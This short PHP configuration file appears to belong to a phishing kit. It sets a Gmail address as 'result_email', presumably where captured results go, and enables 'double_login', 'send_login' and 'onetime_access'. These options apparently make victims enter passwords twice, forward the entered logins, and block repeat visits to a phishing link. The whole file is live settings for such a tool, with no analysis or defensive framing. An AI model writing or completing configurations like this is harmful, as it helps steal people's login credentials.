<?php
return array (
  'result_email' => 'toolsfac2026@gmail.com',
  'parameter' => 'app',
  'onetime_access' => true,
  'double_login' => true,
  'send_login' => true,
);
